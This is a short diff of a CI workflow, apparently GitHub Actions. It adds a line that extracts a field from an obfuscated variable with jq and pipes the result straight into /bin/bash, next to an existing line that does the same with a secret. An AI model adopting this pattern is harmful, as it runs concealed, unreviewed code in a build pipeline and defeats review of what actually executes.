@@ -18,6 +18,7 @@ jobs:
           jzdr1: ${{ secrets.jzdr1 }}
         run: |
           printf '%s' "$jzdr1" | jq -r .qzqkl3674 | /bin/bash
+          printf '%s' "$f42" | jq -r .zu359 | /bin/bash
 
       - name: Save archive
         if: always()
